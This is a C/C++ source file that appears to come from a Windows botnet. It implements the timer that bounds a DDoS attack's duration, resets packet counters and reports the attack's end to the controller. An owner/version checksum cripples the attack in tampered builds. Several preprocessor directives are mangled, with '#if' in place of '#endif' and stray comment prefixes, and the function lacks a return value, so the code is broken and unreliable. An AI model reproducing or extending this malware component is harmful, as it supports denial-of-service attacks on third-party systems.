#include "../Includes/includes.h"

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef INCLUDE_DDOS
DWORD WINAPI NonBlockingDdosTimer(LPVOID);

void StartNonBlockingDdosTimer()
{
    while(true)
    {
        HANDLE hThread = CreateThread(NULL, NULL, NonBlockingDdosTimer, NULL, NULL, NULL);

        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        CloseHandle(hThread);

        Sleep(10);
    }
}

DWORD WINAPI NonBlockingDdosTimer(LPVOID)
{
    bool bTimerIsHttpRelated = bStoreParameter;
    bool bPacketAccountable = bStoreParameter2;

    DWORD dwTotalMilliseconds = dwStoreParameter * 1000;
    DWORD dwElapsedMilliseconds = 0;

    DWORD dwElapsedSeconds = 0;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s--%s", cVersion, cOwner);
    char *cStr = cCheckString;
    unsigned long ulCheck = (((10000/100)*100)-4619);
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum2)
        dwTotalMilliseconds = 20;
    // <!-------! CRC AREA STOP !-------!>

    for(DWORD dwElapsedMilliseconds = 0; dwElapsedMilliseconds < dwTotalMilliseconds; dwElapsedMilliseconds++)
    {
        Sleep(1);

        if(dwElapsedMilliseconds % 1000 == 0)
            dwElapsedSeconds++;

        if(!bDdosBusy)
            break;
    }

    bDdosBusy = FALSE;

    if(bTimerIsHttpRelated)
    {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef HTTP_BUILD
        SendHttpDdosStop(bPacketAccountable, dwHttpPackets, dwElapsedSeconds);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
        dwHttpPackets = 0;
    }
    else
    {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef HTTP_BUILD
        SendSockDdosStop(bPacketAccountable, dwSockPackets, dwElapsedSeconds);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
        dwSockPackets = 0;
    }
}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
